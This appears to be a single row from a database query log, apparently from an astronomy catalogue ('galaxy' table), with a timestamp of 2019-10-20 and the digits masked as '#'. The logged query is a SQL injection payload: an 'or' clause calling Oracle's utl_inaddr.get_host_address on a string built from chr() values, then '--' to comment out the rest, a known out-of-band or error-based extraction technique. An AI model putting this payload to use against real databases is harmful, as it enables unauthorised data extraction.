1,select top # * from galaxy or #=utl_inaddr.get_host_address((chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)))--
2019-10-20 18:26:00,1
